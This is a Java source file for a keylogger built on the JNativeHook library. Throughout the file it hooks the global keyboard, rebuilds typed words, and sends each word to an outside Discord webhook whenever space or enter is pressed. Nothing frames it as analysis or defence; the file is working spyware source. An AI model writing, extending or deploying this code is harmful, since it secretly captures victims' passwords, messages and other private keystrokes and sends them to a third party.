package com.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {
    private StringBuilder currentWord = new StringBuilder();
    private boolean shiftPressed = false;
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            shiftPressed = true;
        }
        else if (e.getKeyCode() == NativeKeyEvent.VC_SPACE && currentWord.length() > 0) {
            DiscordWebhook.send(currentWord.toString());
            currentWord.setLength(0);
        }
        else if (e.getKeyCode() == NativeKeyEvent.VC_ENTER && currentWord.length() > 0) {
            DiscordWebhook.send(currentWord.toString());
            currentWord.setLength(0);
        }
        else if (e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE && currentWord.length() > 0) {
            currentWord.setLength(currentWord.length() - 1);
        }
    }
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            shiftPressed = false;
        }
        
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (keyText.length() == 1 && Character.isLetterOrDigit(keyText.charAt(0))) {
            char c = keyText.charAt(0);
            if (Character.isLetter(c) && !shiftPressed) {
                c = Character.toLowerCase(c);
            }
            currentWord.append(c);
        }
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {}
    
    public void start() {
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);
        } catch (Exception e) {
            System.exit(1);
        }
    }
}